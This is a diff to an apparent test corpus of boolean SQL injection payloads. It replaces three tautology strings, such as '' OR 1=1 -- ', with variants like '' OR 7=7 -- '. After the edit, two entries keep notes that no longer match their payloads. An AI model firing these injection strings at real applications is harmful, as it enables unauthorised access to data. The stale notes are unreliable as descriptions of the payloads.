@@ -19,21 +19,21 @@
     },
     {
       "id": "a03",
-      "payload": "' OR 1=1 -- ",
+      "payload": "' OR 7=7 -- ",
       "class": "boolean",
       "note": "Numeric always-true, commented.",
       "success_when": "returns more than 1 row"
     },
     {
       "id": "a04",
-      "payload": "zzz' OR 'a'='a",
+      "payload": "' OR 'ab'<>'cd",
       "class": "boolean",
       "note": "No match then always-true.",
       "success_when": "returns more than 1 row"
     },
     {
       "id": "a05",
-      "payload": "' OR ''='",
+      "payload": "' OR 'ok'='ok",
       "class": "boolean",
       "note": "Empty-string tautology.",
       "success_when": "returns more than 1 row"
